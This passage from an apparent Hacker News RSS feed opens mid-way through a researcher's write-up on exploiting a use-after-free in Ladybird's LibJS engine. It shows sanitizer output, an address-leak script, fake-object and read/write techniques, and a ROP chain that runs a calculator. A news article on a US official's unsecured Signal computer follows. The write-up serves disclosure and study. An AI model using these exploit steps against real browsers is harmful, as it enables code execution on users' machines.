</span></span><span><span>    <span>#11 0x7f98dd232d4b  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc32d4b)</span>
</span></span><span><span>    <span>#12 0x7f98dd22a381  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc2a381)</span>
</span></span><span><span>    <span>#13 0x7f98dd539cdd  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xf39cdd)</span>
</span></span><span><span>    <span>#14 0x7f98dce78c0e  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x878c0e)</span>
</span></span><span><span>    <span>#15 0x7f98dcdcdc0a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cdc0a)</span>
</span></span><span><span>    <span>#16 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#17 0x7f98dcdb6971  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b6971)</span>
</span></span><span><span>    <span>#18 0x562b5099e2a2  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1922a2)</span>
</span></span><span><span>    <span>#19 0x562b5099b114  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x18f114)</span>
</span></span><span><span>    <span>#20 0x562b509c1029  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1b5029)</span>
</span></span><span><span>    <span>#21 0x7f98dae2a1fd  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a1fd) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>
</span></span><span><span>previously allocated by thread T0 here:
</span></span><span><span>    <span>#0 0x562b50941bc7  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x135bc7)</span>
</span></span><span><span>    <span>#1 0x7f98dcd39c7f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x739c7f)</span>
</span></span><span><span>    <span>#2 0x7f98dcd3963d  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x73963d)</span>
</span></span><span><span>    <span>#3 0x7f98dce90c12  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x890c12)</span>
</span></span><span><span>    <span>#4 0x7f98dcdcc161  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cc161)</span>
</span></span><span><span>    <span>#5 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#6 0x7f98dcdb6971  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b6971)</span>
</span></span><span><span>    <span>#7 0x562b5099e2a2  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1922a2)</span>
</span></span><span><span>    <span>#8 0x562b5099b114  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x18f114)</span>
</span></span><span><span>    <span>#9 0x562b509c1029  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1b5029)</span>
</span></span><span><span>    <span>#10 0x7f98dae2a1fd  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a1fd) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>
</span></span><span><span>SUMMARY: AddressSanitizer: heap<span>-</span>use<span>-</span>after<span>-</span>free (<span>/</span>home<span>/</span>jess<span>/</span>code<span>/</span>ladybird<span>-</span>flake<span>/</span>ladybird<span>/</span>Build<span>/</span>old<span>/</span>bin<span>/../</span>lib64<span>/</span>liblagom<span>-</span>js<span>.</span>so<span>.0</span><span>+</span><span>0xbbf19d</span>)
</span></span><span><span>Shadow bytes around the buggy address:
</span></span><span><span>  <span>0x502000003600</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa
</span></span><span><span>  <span>0x502000003680</span>: fa fa <span>00</span> <span>00</span> fa fa <span>00</span> fa fa fa <span>00</span> fa fa fa <span>00</span> fa
</span></span><span><span>  <span>0x502000003700</span>: fa fa <span>00</span> fa fa fa fd fa fa fa fd fa fa fa <span>00</span> fa
</span></span><span><span>  <span>0x502000003780</span>: fa fa <span>00</span> <span>00</span> fa fa <span>00</span> fa fa fa <span>00</span> <span>00</span> fa fa <span>00</span> <span>00</span>
</span></span><span><span>  <span>0x502000003800</span>: fa fa fd fd fa fa fd fa fa fa <span>00</span> fa fa fa <span>00</span> fa
</span></span><span><span><span>=&gt;</span><span>0x502000003880</span>: fa fa <span>00</span> <span>00</span> fa fa <span>00</span> <span>00</span> fa fa <span>00</span> <span>00</span> fa fa[fd]fd
</span></span><span><span>  <span>0x502000003900</span>: fa fa <span>00</span> fa fa fa <span>00</span> fa fa fa <span>00</span> <span>00</span> fa fa <span>00</span> fa
</span></span><span><span>  <span>0x502000003980</span>: fa fa <span>00</span> fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>  <span>0x502000003a00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>  <span>0x502000003a80</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>  <span>0x502000003b00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>Shadow byte legend (one shadow byte represents <span>8</span> application bytes):
</span></span><span><span>  Addressable:           <span>00</span>
</span></span><span><span>  Partially addressable: <span>01</span> <span>02</span> <span>03</span> <span>04</span> <span>05</span> <span>06</span> <span>07</span>
</span></span><span><span>  Heap left redzone:       fa
</span></span><span><span>  Freed heap region:       fd
</span></span><span><span>  Stack left redzone:      f1
</span></span><span><span>  Stack mid redzone:       f2
</span></span><span><span>  Stack right redzone:     f3
</span></span><span><span>  Stack after <span>return</span>:      f5
</span></span><span><span>  Stack use after scope:   f8
</span></span><span><span>  Global redzone:          f9
</span></span><span><span>  Global init order:       f6
</span></span><span><span>  Poisoned by user:        f7
</span></span><span><span>  Container overflow:      fc
</span></span><span><span>  Array cookie:            ac
</span></span><span><span>  Intra object redzone:    bb
</span></span><span><span>  ASan internal:           fe
</span></span><span><span>  Left alloca redzone:     ca
</span></span><span><span>  Right alloca redzone:    cb
</span></span><span><span><span>==</span><span>8726</span><span>==</span>ABORTING
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2><p>UAFâ€™s tend to be a nice primitive to work with. In this case, the UAF occurs in the glibc malloc heap
(since thatâ€™s where the argument buffer is allocated), rather than in a garbage-collected arena
where a lot of objects actually reside. The malloc heap mainly holds backing buffers and such,
introducing a bit of complexity when it comes to finding the right objects for a leak; although this is
somewhat mitigated by the powerful primitives available.</p><h3 id="leaking-an-object">Leaking an Object</h3><p>We can craft an <code>addrof</code>-capability by fitting a pointer somewhere inside the old <code>arguments_list</code> allocation,
then reading the
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/arguments"><code>arguments</code></a>
object from inside the constructor.</p><p>Hereâ€™s an example of how we can leak the address of an object:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>let</span> <span>target</span> <span>=</span> {};
</span></span><span><span><span>let</span> <span>linked</span> <span>=</span> <span>new</span> <span>FinalizationRegistry</span>(() =&gt; {});
</span></span><span><span>
</span></span><span><span><span>function</span> <span>meow</span>() {}
</span></span><span><span>
</span></span><span><span><span>let</span> <span>handler</span> <span>=</span> {
</span></span><span><span>    <span>get</span>() {
</span></span><span><span>        <span>// [2]
</span></span></span><span><span><span></span>        <span>// allocate more than 0x30 to free the chunk
</span></span></span><span><span><span></span>        <span>meow</span>(<span>0x1</span>, <span>0x2</span>, <span>0x3</span>, <span>0x4</span>, <span>0x5</span>, <span>0x6</span>);
</span></span><span><span>
</span></span><span><span>        <span>// [3]
</span></span></span><span><span><span></span>        <span>// allocate the free'd chunk, with pointer to the target
</span></span></span><span><span><span></span>        <span>linked</span>.<span>register</span>(<span>target</span>, <span>undefined</span>, <span>undefined</span>, <span>undefined</span>, <span>undefined</span>, <span>undefined</span>)
</span></span><span><span>    }
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>function</span> <span>Construct</span>() {
</span></span><span><span>    <span>// [4]
</span></span></span><span><span><span></span>    <span>// read the linked list node, containing the pointer
</span></span></span><span><span><span></span>    <span>console</span>.<span>log</span>(<span>arguments</span>)
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>let</span> <span>ConstructProxy</span> <span>=</span> <span>new</span> Proxy(<span>Construct</span>, <span>handler</span>);
</span></span><span><span>
</span></span><span><span><span>// [1]
</span></span></span><span><span><span>// allocate a 0x30 chunk
</span></span></span><span><span><span>// 0x8 * 5 (js values) + 0x8 (malloc metadata) = 0x30
</span></span></span><span><span><span></span><span>new</span> <span>ConstructProxy</span>(<span>0x1</span>, <span>0x2</span>, <span>0x3</span>, <span>0x4</span>, <span>0x5</span>);
</span></span></code></pre></div><p><label for="sn-2"></label>

<span>The series of <code>undefined</code> arguments on $[3]$ is to make sure the <i>linked list node</i> is allocated
in our free chunk and not any prelude allocations.</span></p><p><code>FinalizationRegistry</code> places linked list nodes with object pointers on the malloc heap
rendering them a useful structure to leak. Running the exploit we get the double representation of
the pointer, if we repeat a few times they change slightly, subject to ASLR</p><div><pre tabindex="0"><code data-lang="ruby"><span><span><span>âžœ</span>  ladybird <span>git</span>:(b8fa355a21) <span>âœ—</span> <span>Build</span><span>/</span>old<span>/</span>bin<span>/</span>js arguments<span>.</span>js
</span></span><span><span><span>ArgumentsObject</span>{ <span>"0"</span>: <span>6</span><span>.</span><span>9077829341497</span>e<span>-</span><span>310</span>, <span>"1"</span>: undefined, <span>"2"</span>: <span>0</span>, <span>"3"</span>: <span>0</span>, <span>"4"</span>: <span>5</span> }
</span></span><span><span><span>âžœ</span>  ladybird <span>git</span>:(b8fa355a21) <span>âœ—</span> <span>Build</span><span>/</span>old<span>/</span>bin<span>/</span>js arguments<span>.</span>js
</span></span><span><span><span>ArgumentsObject</span>{ <span>"0"</span>: <span>6</span><span>.</span><span>8997364430636</span>e<span>-</span><span>310</span>, <span>"1"</span>: undefined, <span>"2"</span>: <span>0</span>, <span>"3"</span>: <span>0</span>, <span>"4"</span>: <span>5</span> }
</span></span></code></pre></div><p>And sure enough when we <code>pack</code> into raw bytes, we get the pointer!</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>&gt;&gt;&gt;</span> struct<span>.</span>pack(<span>"&lt;d"</span>, <span>6.8997364430636e-310</span>)[::<span>-</span><span>1</span>]<span>.</span>hex()
</span></span><span><span><span>'00007f0350fc2118'</span>
</span></span></code></pre></div><h3 id="creating-a-fake-object">Creating a Fake Object</h3><p>We can fake a JavaScript object pointer in a similar way. We allocate a buffer into <code>arguments_list</code>,
write our fake object pointer into it, and then use the fake object inside the constructor.
There are a few additional considerations:</p><ul><li>Our <code>free(arguments_list)</code> mechanism relies on vector reallocation, so the size of our target structures
needs to increase monotonically, and in steps large enough to trigger a reallocation.</li><li>Once we know where our fake object is, we need to tag it in accordance with Ladybirdâ€™s nan-boxing scheme,
so the engine knows its type.</li></ul><p>Apart from that, itâ€™s very similar; and weâ€™ll do so in the next section.</p><h2 id="arbitrary-readwrite">Arbitrary Read/Write</h2><p>Dynamic property lookups on objects are handled by the <code>get_by_value</code> function, shown below.
If the key is an index ([1]) and the object is an array-like ([2]) (it has an <code>m_indexed_properties</code> member),
then the property is fetched from the <code>m_indexed_properties</code> member.</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>inline</span> ThrowCompletionOr<span>&lt;</span>Value<span>&gt;</span> get_by_value(
</span></span><span><span>    VM<span>&amp;</span> vm,
</span></span><span><span>    Optional<span>&lt;</span>IdentifierTableIndex<span>&gt;</span> base_identifier,
</span></span><span><span>    Value base_value,
</span></span><span><span>    Value property_key_value,
</span></span><span><span>    Executable <span>const</span><span>&amp;</span> executable
</span></span><span><span>) {
</span></span><span><span>    <span>// [1]
</span></span></span><span><span><span></span>    <span>// OPTIMIZATION: Fast path for simple Int32 indexes in array-like objects.
</span></span></span><span><span><span></span>    <span>if</span> (base_value.is_object() <span>&amp;&amp;</span> property_key_value.is_int32() <span>&amp;&amp;</span> property_key_value.as_i32() <span>&gt;=</span> <span>0</span>) {
</span></span><span><span>        <span>auto</span><span>&amp;</span> object <span>=</span> base_value.as_object();
</span></span><span><span>        <span>auto</span> index <span>=</span> <span>static_cast</span><span>&lt;</span>u32<span>&gt;</span>(property_key_value.as_i32());
</span></span><span><span>
</span></span><span><span>        <span>auto</span> <span>const</span><span>*</span> object_storage <span>=</span> object.indexed_properties().storage();
</span></span><span><span>
</span></span><span><span>        <span>// [2]
</span></span></span><span><span><span></span>        <span>// For "non-typed arrays":
</span></span></span><span><span><span></span>        <span>if</span> (<span>!</span>object.may_interfere_with_indexed_property_access()
</span></span><span><span>            <span>&amp;&amp;</span> object_storage) {
</span></span><span><span>            <span>auto</span> maybe_value <span>=</span> [<span>&amp;</span>] {
</span></span><span><span>                <span>// [3]
</span></span></span><span><span><span></span>                <span>if</span> (object_storage<span>-&gt;</span>is_simple_storage())
</span></span><span><span>                    <span>return</span> <span>static_cast</span><span>&lt;</span>SimpleIndexedPropertyStorage <span>const</span><span>*&gt;</span>(object_storage)<span>-&gt;</span>inline_get(index);
</span></span><span><span>                <span>else</span>
</span></span><span><span>                    <span>return</span> <span>static_cast</span><span>&lt;</span>GenericIndexedPropertyStorage <span>const</span><span>*&gt;</span>(object_storage)<span>-&gt;</span>get(index);
</span></span><span><span>            }();
</span></span><span><span>            <span>if</span> (maybe_value.has_value()) {
</span></span><span><span>                <span>auto</span> value <span>=</span> maybe_value<span>-&gt;</span>value;
</span></span><span><span>                <span>if</span> (<span>!</span>value.is_accessor())
</span></span><span><span>                    <span>return</span> value;
</span></span><span><span>            }
</span></span><span><span>        }
</span></span><span><span>        
</span></span><span><span>        <span>// try some further optimizations, otherwise fallback to a generic `internal_get`
</span></span></span><span><span><span></span>        ...
</span></span></code></pre></div><p>Furthermore if the storage type is <code>SimpleIndexedPropertyStorage</code> then the following method is used.</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>[[nodiscard]]</span> Optional<span>&lt;</span>ValueAndAttributes<span>&gt;</span> inline_get(u32 index) <span>const</span>
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>!</span>inline_has_index(index))
</span></span><span><span>        <span>return</span> {};
</span></span><span><span>    <span>return</span> ValueAndAttributes { m_packed_elements.data()[index], default_attributes };
</span></span><span><span>}
</span></span></code></pre></div><p>This indexes into the <code>m_packed_elements</code> vector using our offset. This code path (indexing into an array-like object
that has a <code>SimpleIndexedPropertyStorage</code>) contains no virtual function calls, meaning we donâ€™t need to give our fake
object a vtable pointer â€” which is useful, in that we donâ€™t need to know where one is.</p><p>We set up our fake object such that <code>m_indexed_properties</code> points to a fake
<code>SimpleIndexedPropertyStorage</code> object, whose <code>m_packed_elements</code> then points to the location of the read.
This is simpler than it sounds, as all these structures can be overlapped in the same memory region.</p><p><img src="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/ladybird-uaf-graph.png" alt="Diagram of object layout"></p><p>Now that we have the structures laid out in memory, all thatâ€™s left is ensuring:</p><ul><li>[2] passes: by setting <code>m_may_interfere_with_indexed_property_access</code> to <code>false</code></li><li>and [3] passes: by setting <code>m_is_simple_storage</code> on the object storage to <code>true</code></li></ul><p>After we have a reliable read capability, we can leak the vtable for <code>SimpleIndexedPropertyStorage</code>,
then patch our fake storage object. This gives us a write capability by doing the opposite process to the
read, without crashing.</p><h2 id="code-execution">Code Execution</h2><p>Once we have an arbitrary read/write, we have complete control over the renderer:</p><ul><li>We can mess with internal values in the renderer,</li><li>We can craft a fake vtable to gain control flow after a stack pivot,</li><li>We can overwrite stack return pointers and construct a ROP chain.</li></ul><p>The most reliable method for getting code execution appears to be overwriting a return pointer.</p><p>First, we leak the location of the stack by following a chain of pointers around the address space.
The chain begins with a pointer into the LibJS mapping (the vtable pointer of our object). From there,
we leak a GOT entry taking us to libc, where we finally leak a pointer to the stack (via <code>__libc_argv</code>).</p><p>Once weâ€™ve found the stack, we search for a specific return pointer (<code>__libc_start_call_main</code>)
and overwrite it with a ROP chain. The POC ROP chain is simple; it <code>execve</code>â€™s <code>/calc</code>
(<a href="https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls#x86_64-64-bit">syscall <code>0x3b</code></a>),
which is a symbolic link to the calculator app. A more complex payload would map RWX pages for a second
stage.</p><p>All thatâ€™s left is to close the tab, which will collapse the stack and trigger the ROP chain.</p><p><a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/uaf-browser.zip">This</a> is the final exploit code for the browser, and <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/uaf-shell.js">this</a> is
the exploit for the REPL. Both working on <code>b8fa355a21</code> â€” x86_64-linux</p><p>Below is a video of the final exploit!</p><video controls="">
<source src="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/ladybird-uaf.mp4" type="video/mp4"></video></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How the US defense secretary circumvents official DoD communications equipment (166 pts)]]></title>
            <link>https://www.electrospaces.net/2025/04/how-us-defense-secretary-hegseth.html</link>
            <guid>43851612</guid>
            <pubDate>Wed, 30 Apr 2025 22:54:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.electrospaces.net/2025/04/how-us-defense-secretary-hegseth.html">https://www.electrospaces.net/2025/04/how-us-defense-secretary-hegseth.html</a>, See on <a href="https://news.ycombinator.com/item?id=43851612">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-8204503141661364969" itemprop="description articleBody">
<p>

US defense secretary <a href="https://en.wikipedia.org/wiki/Pete_Hegseth" target="_blank">Pete Hegseth</a> appears to have a private computer in his office that is linked to the public internet. He wanted this computer to use the messaging app <a href="https://en.wikipedia.org/wiki/Signal_%28software%29" target="_blank">Signal</a>, which is the preferred method of communication among Trump's government officials.</p><p>

Here I will look at the secretary of defense's <a href="#govt">official communications equipment</a> and the <a href="#cables">SecDef Cables</a> communications center. There's also a photo in which Hegseth's <a href="#personal">private computer</a> can be recognized.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv7F3Lbx-ZqdDOGXEVm4hi9_aaQYPcBR6_R2GCIpUoAwCcZHz5uzSWT-Q9tZ4kQtPOHehAZV65oWQuiCkVHy_BYjfYl42AVWRU6BIuCaxtswMyK8pUS6SKIlNApNssJQqGNYIxNDSKhs_MQOg9k1jCrwc6S2ePLpWzwx7IGYxbbCQyYhyphenhyphenppZ0i_v2W2lQ/s1920/hegseth-pentagonoffice.jpg" target="_blank"><img alt="" data-original-height="1080" data-original-width="1920" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv7F3Lbx-ZqdDOGXEVm4hi9_aaQYPcBR6_R2GCIpUoAwCcZHz5uzSWT-Q9tZ4kQtPOHehAZV65oWQuiCkVHy_BYjfYl42AVWRU6BIuCaxtswMyK8pUS6SKIlNApNssJQqGNYIxNDSKhs_MQOg9k1jCrwc6S2ePLpWzwx7IGYxbbCQyYhyphenhyphenppZ0i_v2W2lQ/s600/hegseth-pentagonoffice.jpg" width="650"></a></p>
<p><span size="2">
    US defense secretary Pete Hegseth in his office in the Pentagon, January 30, 2025<br>
    <span color="gray">(Still from a <a href="https://x.com/DeptofDefense/status/1884968646092464600" target="_blank">video message</a> on X, formerly Twitter)</span><br>
  </span>
</p>


<p><span size="+2"><b>Hegseth's government equipment</b></span></p><p>

Like his predecessors, Trump's defense secretary Pete Hegseth has access to a range of secure and non-secure telephone and computer networks. The equipment is installed at a table behind his back, when sitting at his big writing desk in the Pentagon.</p><p>

In the photo above we can see that equipment in a set-up that has basically been <a href="https://commons.wikimedia.org/wiki/File:Defense_Secretary_Chuck_Hagel_speaks_from_his_Pentagon_office_by_phone_with_Malaysian_Defense_Minister_Datuk_Seri_Hishammuddin_Tun_Hussein,_July_18,_2014,_to_offer_his_condolences_for_those_who_lost_their_lives_140718-D-NI589-005c.jpg" target="_blank">unchanged</a> since Chuck Hagel, who was Obama's secretary of Defense from 2013 to 2015. In the photo of Pete Hegseth we see from left to right:</p><div><p>
- On top of a wooden stand sits a Cisco IP Phone 8851 with a 14-key <a href="https://www.cisco.com/c/en/us/products/collaboration-endpoints/ip-phone-8851-8861-key-expansion-module/index.html" target="_blank">expansion module</a>. This phone is part of the Crisis Management System (CMS), which connects the President, the National Security Council, Cabinet members, the Joint Chiefs of Staff, intelligence agency watch centers, and others. Its bright yellow bezel indicates that it can be used for conversations up to Top Secret/Sensitive Compartmented Information (TS/SCI). </p><p>

- Below the CMS phone on the wooden stand is (hardly visible) an <a href="https://www.cryptomuseum.com/crypto/raytheon/ist2/" target="_blank">Integrated Services Telephone-2</a> (IST-2), which can be used for both secure and non-secure phone calls. This phone belongs to the <a href="https://en.wikipedia.org/wiki/Defense_Red_Switch_Network" target="_blank">Defense Red Switch Network</a> (DRSN), also known as the Multilevel Secure Voice service, which connects the White House, all military command centers, intelligence agencies, government departments and NATO allies.</p><p>

- Right in front of the IST-2 is another Cisco IP Phone 8851 with a 14-key expansion module, but this time with a green bezel, which indicates that it's for unclassified phone calls. This phone is part of the internal telephone network of the Pentagon and replaced an <a href="https://www.metrolinedirect.com/def64tel1.html" target="_blank">Avaya Lucent 6424</a> executive phone.</p></div>
<p>
A better view of these phones is provided by the following photo from 2021:</p><div><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhd5Vycz7MhvSOBVlkUbA5pINdcIDHJ1jySWLk5fW_ugxdT2BNSz7n7M71oR7PWPcqcVXWoDz5ZWG1cG2ORioLJ4KS_R6gV_9yWnxqVCrnDGiPTDAhx1VLz3LuZJ9udkzKe4PNGD2F6btXoIhZQiqfAP84ZAd_iLzFSIO1cGRBnlyaW2ToBxKESJ4m9tc/s1000/secdef-austin-2021.jpg" target="_blank"><img alt="" data-original-height="728" data-original-width="1000" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhd5Vycz7MhvSOBVlkUbA5pINdcIDHJ1jySWLk5fW_ugxdT2BNSz7n7M71oR7PWPcqcVXWoDz5ZWG1cG2ORioLJ4KS_R6gV_9yWnxqVCrnDGiPTDAhx1VLz3LuZJ9udkzKe4PNGD2F6btXoIhZQiqfAP84ZAd_iLzFSIO1cGRBnlyaW2ToBxKESJ4m9tc/s1000/secdef-austin-2021.jpg" width="550"></a></p><p><span size="2">
    Former secretary of defense Lloyd Austin in his Pentagon office in 2021, <br>
    with a Cisco IP phone with yellow bezel for the CMS and<br>
    an IST-2 phone with many red buttons for the DRSN.<br>
    <span color="gray">(DoD photo - click to enlarge)</span><br>
  </span>
</p></div>
<div><p>
- Besides the telephones there are two computer screens, both with a bright green wallpaper, which again indicates that they are connected to an unclassified network, most likely <a href="https://en.wikipedia.org/wiki/NIPRNet" target="_blank">NIPRNet</a>. In the photo of Lloyd Austin's office we see that there's also a <a href="https://en.wikipedia.org/wiki/KVM_switch" target="_blank">KVM switch</a> which is used to switch securely to the <a href="https://en.wikipedia.org/wiki/SIPRNet" target="_blank">SIPRNet</a> (Secret) and <a href="https://en.wikipedia.org/wiki/Joint_Worldwide_Intelligence_Communications_System" target="_blank">JWICS</a> (Top Secret/SCI) networks, using the same keyboard, video and mouse set.</p><p>

- Finally, at the right side of the table there are two <a href="https://www.cisco.com/c/en/us/products/collateral/collaboration-endpoints/webex-desk-series/datasheet-c78-731879.html" target="_blank">Cisco Webex DX80</a> videoteleconferencing screens. The one at the right has a yellow label, which indicates that it's approved for Top Secret/SCI and most likely belongs to the Secure Video Teleconferencing System (SVTS), which is part of the aforementioned Crisis Management System (CMS). The other screen might then be for videoconferences at a lower classification level.</p></div>



  <p><span size="+2"><b>Hegseth's personal computer</b></span></p><p>

Despite the wide range of options for communicating via the proper and secure government channels, secretary Hegseth insisted on using Signal. Apparently it wasn't allowed or possible to install this app on one of the government computers, nor on a smartphone that is approved for classified conversations.</p><p>
  
Therefore, Hegseth initially went to the back area of his office where he could access Wi-Fi to use Signal, <a href="https://apnews.com/article/hegseth-signal-chat-dirty-internet-line-6a64707f10ca553eb905e5a70e10bd9d" target="_blank">according</a> to AP News. It's not clear whether he used a private laptop or his personal smartphone, both of which would have been strictly forbidden to use in secure areas like this.</p>
  <p>
Somewhat later, Hegseth requested an internet connection to his desk where he could use a computer of his own. This line connects directly to the public internet and bypassed the Pentagon's security protocols. This new computer must be the one that can be seen in the photo below, as it wasn't there yet on <a href="https://www.jbsa.mil/News/News/Article/4073962/hegseth-addresses-strengthening-military-by-cutting-excess-refocusing-dod-budget/" target="_blank">February 21</a> and has no labels that indicate its classification level:</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAlv8am9q3K3oLKPcxUf0CsQeC-nUfFQBCHIhCdh1tGchtEv3TvpP3FQd4e6YSK5JZ9mNXa0Epr0Xd603kwfQ9aHdy7jHjLJUP519RAgzNrzne3PwZfnEXApk1i0ApByBkrHghn5DQzHXtZaCPEZQfxYZABglRMeQx5GWv_tCSeJeAu9AGcTI6ouPY6P0/s961/hegseth-march2025.jpg" target="_blank"><img alt="" data-original-height="626" data-original-width="961" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAlv8am9q3K3oLKPcxUf0CsQeC-nUfFQBCHIhCdh1tGchtEv3TvpP3FQd4e6YSK5JZ9mNXa0Epr0Xd603kwfQ9aHdy7jHjLJUP519RAgzNrzne3PwZfnEXApk1i0ApByBkrHghn5DQzHXtZaCPEZQfxYZABglRMeQx5GWv_tCSeJeAu9AGcTI6ouPY6P0/s600/hegseth-march2025.jpg" width="600"></a></p>
<p><span size="2">
    US defense secretary with a new desktop computer on his desk, March 20, 2025<br>
    <span color=" gray">(DoD photo, see also this <a href="https://x.com/SecDef/status/1902773449069621429" target="_blank">video message</a> on X)</span><br>
  </span>
</p>
<p>


Some other employees at the Pentagon also <a href="https://apnews.com/article/hegseth-signal-chat-dirty-internet-line-6a64707f10ca553eb905e5a70e10bd9d" target="_blank">use</a> direct lines to the public internet, for example when they don't want to be recognized by an IP address assigned to the Pentagon. That's risky because such a line is less well monitored than NIPRNet, which allows limited access to the outside internet.</p><p>
  
At his new desktop computer, Hegseth <a href="https://www.washingtonpost.com/national-security/2025/04/23/hegseth-signal-pentagon-computer/" target="_blank">had</a> Signal installed, which means he effectively 'cloned' the Signal app that is on his personal smartphone. He also had interest in the installation of a program to send conventional text messages from this personal computer, according to some press sources.</p><p>
  
The move was intended to <a href="https://www.washingtonpost.com/national-security/2025/04/23/hegseth-signal-pentagon-computer/" target="_blank">circumvent</a> a lack of cellphone service in much of the Pentagon and enable easier communication with the White House and other Trump officials who are using the Signal app.</p><p><span size="+2"><b>SecDef Cables</b></span></p><p>
 
It is remarkable to what great lengths Hegseth went to use the Signal app, because as defense secretary he has his own communications center which is specialized in keeping him in contact with anyone he wants. This center is commonly called SecDef Cables and is part of <a href="https://www.disa.mil/Careers/SecDef-Comms-Support" target="_blank">Secretary of Defense Communications</a> (SDC) unit.</p><p>

SecDef Cables provides operational information management and functions as a command and control support center. It is staffed by 26 service members and 4 civilians. They provide "comprehensive voice, video, and data capabilities to the secretary and his immediate staff, regardless of their location, across multiple platforms and classifications."</p><p>

Furthermore, SecDef Cables serves as a liaison to the National Military Command Center (NMCC), the White House Situation Room, the State Department Operations Center and similar communication centers. Finally, Cables provides the connections for the Defense Telephone Link (DTL), which is a lower-level hotline with military counterparts in about 25 countries, including Russia and China.</p>
  <div>
    <iframe width="560" height="315" src="https://www.youtube.com/embed/If_ZlsFsbzw?si=1c-u-nf3DRjJVBqH" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
    <p><span size="2">
      Secretary of Defense Communications recruitment video from 2023<br>
    </span>
  </p></div>

<p>


<b>Links and sources</b></p><p><span size="2">
  - emptywheel: <a href="https://www.emptywheel.net/2025/04/25/whiskey-petes-dirty-desktop/" target="_blank">Whiskey Peteâ€™s Dirty Desktop</a> (April 25, 2025)<br>
- AP News: <a href="https://apnews.com/article/hegseth-signal-chat-dirty-internet-line-6a64707f10ca553eb905e5a70e10bd9d" target="_blank">Hegseth had an unsecured internet line set up in his office to connect to Signal, AP sources say</a> (April 24, 2025)<br> 
- The Washington Post: <a href="https://www.washingtonpost.com/national-security/2025/04/23/hegseth-signal-pentagon-computer/" target="_blank">Hegseth had Signal messaging app installed on an office computer</a> (April 24, 2025)<br> 
</span></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Espressif's ESP32-C5 Is Now in Mass Production (164 pts)]]></title>
            <link>https://www.espressif.com/en/news/ESP32-C5_Mass_Production</link>
            <guid>43851314</guid>
            <pubDate>Wed, 30 Apr 2025 22:15:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.espressif.com/en/news/ESP32-C5_Mass_Production">https://www.espressif.com/en/news/ESP32-C5_Mass_Production</a>, See on <a href="https://news.ycombinator.com/item?id=43851314">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-newsDetail-wrap">
  
